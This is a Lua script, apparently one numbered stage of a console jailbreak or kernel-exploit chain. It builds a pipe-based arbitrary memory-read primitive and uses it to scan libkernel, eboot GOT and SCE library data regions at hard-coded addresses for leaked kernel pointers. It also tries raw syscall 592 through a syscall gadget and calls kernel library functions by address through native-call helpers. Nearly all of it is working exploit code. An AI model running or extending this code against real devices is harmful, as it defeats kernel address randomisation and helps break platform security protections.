-- step189: Scan eboot + libkernel GOT for kernel pointers; try fcall_with_rax for syscall 592
print("=== STEP189 ===")

local function tn(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function rq(a) return memory.read_qword(a) end
local function wq(a, v) memory.write_qword(a, v) end
local function rd(a) return memory.read_dword(a) end
local function wd(a, v) memory.write_dword(a, v) end
local function wb(a, v) memory.write_byte(a, v) end
local Z = uint64(0)

local function is_kptr(v)
    local vs = tostring(v)
    if vs:find("ffffffff8") or vs:find("ffffffff9") or
       vs:find("fffffffa") or vs:find("fffffffb") or
       vs:find("fffffffc") or vs:find("fffffffd") or
       vs:find("fffffffe") then return true end
    return false
end

syscall.resolve({ read = 3, write = 4, close = 6, writev = 121, pipe = 42 })

-- Pipe for peek
local pipe_r, pipe_w
pcall(function() pipe_r, pipe_w = create_pipe() end)
local iov_b = memory.alloc(0x100)
local pbuf = memory.alloc(0x2000)

local function peek8(addr_u64)
    if not pipe_w or pipe_w == 0 then return nil end
    wq(iov_b, addr_u64)
    wq(iov_b + 8, uint64(8))
    local ok, r = pcall(function()
        return syscall.writev(uint64(pipe_w), iov_b, uint64(1))
    end)
    if not ok or tn(r) ~= 8 then return nil end
    for i = 0, 7 do wb(pbuf + i, 0) end
    syscall.read(uint64(pipe_r), pbuf, uint64(8))
    return rq(pbuf)
end

-- Known addresses from step188
local LK_TEXT_START = uint64(0x832120000)
local LK_TEXT_END   = uint64(0x832168000)
local LK_GOT_START  = uint64(0x83218c000)
local LK_GOT_END    = uint64(0x832190000)
local LK_DATA_START = uint64(0x832190000)
local LK_DATA_END   = uint64(0x8321c4000)

local EBOOT_GOT_START = uint64(0x399d4000)
local EBOOT_GOT_END   = uint64(0x39b18000)

-- ==================================================================
-- T1: Scan libkernel rw- (GOT + data) for kernel pointers
-- ==================================================================
print("---T1: libkernel GOT kernel pointers---")
pcall(function()
    local kptrs = {}
    -- Scan GOT (16K) + data (208K)
    local scan_end = uint64(0x8321c4000)
    local scan_start = uint64(0x83218c000)
    local scan_sz = tn(scan_end) - tn(scan_start)
    print("scanning " .. scan_sz .. " bytes of libkernel rw-")

    for off = 0, scan_sz - 8, 8 do
        local v = peek8(scan_start + uint64(off))
        if v and is_kptr(v) then
            table.insert(kptrs, {off = off, val = tostring(v)})
        end
    end
    print("kernel pointers found: " .. #kptrs)
    for _, p in ipairs(kptrs) do
        print(string.format("  lk_rw+%05x: %s", p.off, p.val))
    end
end)

-- ==================================================================
-- T2: Scan eboot GOT for libkernel function pointers (first 64K)
-- ==================================================================
print("---T2: eboot GOT -> libkernel funcs---")
pcall(function()
    local lk_start = tn(LK_TEXT_START)
    local lk_end = tn(LK_TEXT_END)
    local lk_funcs = {}
    local scan_sz = 0x10000  -- first 64K of GOT

    for off = 0, scan_sz - 8, 8 do
        local v = peek8(EBOOT_GOT_START + uint64(off))
        if v then
            local n = tn(v)
            if n >= lk_start and n < lk_end then
                table.insert(lk_funcs, {off = off, addr = v, lk_off = n - lk_start})
            end
        end
    end
    print("libkernel funcs in eboot GOT: " .. #lk_funcs)
    for _, f in ipairs(lk_funcs) do
        print(string.format("  GOT+%05x -> lk+%05x (%s)", f.off, f.lk_off, tostring(f.addr)))
    end
end)

-- ==================================================================
-- T3: Scan eboot GOT for kernel pointers directly
-- ==================================================================
print("---T3: eboot GOT kernel pointers---")
pcall(function()
    local kptrs = {}
    local scan_sz = 0x10000

    for off = 0, scan_sz - 8, 8 do
        local v = peek8(EBOOT_GOT_START + uint64(off))
        if v and is_kptr(v) then
            table.insert(kptrs, {off = off, val = tostring(v)})
        end
    end
    print("kernel ptrs in eboot GOT: " .. #kptrs)
    for _, p in ipairs(kptrs) do
        print(string.format("  got+%05x: %s", p.off, p.val))
    end
end)

-- ==================================================================
-- T4: Try native.fcall_with_rax for syscall 592
-- ==================================================================
print("---T4: fcall_with_rax for syscall 592---")
pcall(function()
    -- fcall_with_rax likely takes (address, rax_value) and creates a callable
    -- that calls address with RAX=rax_value
    -- The syscall gadget is at 0x832120b57
    local sc_gadget = syscall.syscall_address

    -- Try: native.fcall_with_rax(sc_gadget, 592)(args...)
    local id_buf = memory.alloc(0x400)
    local cnt_buf = memory.alloc(8)
    wq(cnt_buf, uint64(0x40))

    local ok, rv = pcall(function()
        return native.fcall_with_rax(sc_gadget, uint64(592))(id_buf, cnt_buf, Z, Z, Z, Z)
    end)
    print("fcall_with_rax rv=" .. tostring(ok) .. " " .. tostring(rv))

    if ok then
        local mc = tn(rq(cnt_buf))
        print("module count=" .. mc)
        if mc > 0 and mc < 100 then
            for i = 0, math.min(mc - 1, 9) do
                print("  id[" .. i .. "]=" .. tn(rd(id_buf + i * 4)))
            end
        end
    end
end)

-- ==================================================================
-- T5: Try sceKernelGetModuleInfoFromAddr via fcall
-- ==================================================================
print("---T5: sceKernelGetModuleInfoFromAddr---")
pcall(function()
    local func_addr = uint64(0x1518a8198)  -- from libc_addrofs
    local info = memory.alloc(0x200)

    -- Try with eboot base address
    for i = 0, 0x1FF do wb(info + i, 0xAA) end
    wd(info, 0x160)  -- size field

    -- Signature: sceKernelGetModuleInfoFromAddr(void *addr, int flags, void *info)
    -- Or maybe: (addr, info) - try both
    local ok1, rv1 = pcall(function()
        return fcall(func_addr)(eboot_base, Z, info, Z, Z, Z)
    end)
    print("variant1 (addr,0,info): ok=" .. tostring(ok1) .. " rv=" .. tostring(rv1))

    if ok1 and tn(rv1) == 0 then
        -- Dump non-sentinel values
        for off = 0, 0x15F, 8 do
            local v = rq(info + off)
            if tn(v) ~= 0 and tn(v) ~= 0xAAAAAAAAAAAAAAAA then
                print(string.format("  +%03x: %s", off, tostring(v)))
            end
        end
        -- Look for name
        for off = 4, 0x100 do
            local b = tn(memory.read_byte(info + off))
            if b >= 0x61 and b <= 0x7A then -- lowercase letter
                local s = ""
                for j = 0, 31 do
                    local c = tn(memory.read_byte(info + off + j))
                    if c == 0 then break end
                    if c >= 32 and c < 127 then s = s .. string.char(c) end
                end
                if #s > 3 then
                    print("  name at +" .. string.format("%03x", off) .. ": " .. s)
                    break
                end
            end
        end
    end

    -- Try variant 2: (addr, info)
    if not ok1 or tn(rv1) ~= 0 then
        for i = 0, 0x1FF do wb(info + i, 0xBB) end
        wd(info, 0x160)
        local ok2, rv2 = pcall(function()
            return fcall(func_addr)(eboot_base, info, Z, Z, Z, Z)
        end)
        print("variant2 (addr,info): ok=" .. tostring(ok2) .. " rv=" .. tostring(rv2))
    end
end)

-- ==================================================================
-- T6: Quick scan of ALL SCE library rw- regions for kernel pointers
-- ==================================================================
print("---T6: SCE rw- kernel pointer scan---")
pcall(function()
    -- SCE libraries have rw- segments (16K each typically)
    local sce_rw = {
        {0x800c44000, 0x800c48000, "sce_0"},
        {0x802014000, 0x802018000, "sce_1"},
        {0x802114000, 0x802118000, "sce_2"},
        {0x804474000, 0x804478000, "sce_3"},
        {0x8061c8000, 0x8061cc000, "sce_4"},
        {0x807ee8000, 0x807eec000, "sce_5"},
        {0x80c3e4000, 0x80c3e8000, "sce_6"},
        {0x80dc70000, 0x80dc74000, "sce_7"},
        {0x80ff0c000, 0x80ff10000, "sce_8"},
        {0x812bdc000, 0x812be0000, "sce_9"},
        {0x8140c8000, 0x8140dc000, "sce_10"},
        {0x814184000, 0x814188000, "sce_11"},
        {0x8145e0000, 0x8145e4000, "sce_12"},
        {0x815dc4000, 0x815dc8000, "sce_13"},
        {0x81743c000, 0x817440000, "sce_14"},
        {0x8182bc000, 0x8182c0000, "sce_15"},
        {0x81c590000, 0x81c594000, "sce_16"},
        {0x81cb1c000, 0x81cb24000, "sce_17"},
    }

    local total = 0
    for _, r in ipairs(sce_rw) do
        local base = uint64(r[1])
        local sz = r[2] - r[1]
        local kc = 0
        for off = 0, sz - 8, 8 do
            local v = peek8(base + uint64(off))
            if v and is_kptr(v) then
                kc = kc + 1
                if kc <= 3 then
                    print(string.format("  %s+%04x: %s", r[3], off, tostring(v)))
                end
            end
        end
        if kc > 0 then
            print(string.format("  %s: %d kptrs in %dK", r[3], kc, sz / 1024))
            total = total + kc
        end
    end
    print("TOTAL SCE kptrs: " .. total)
end)

print("=== STEP189_DONE ===")
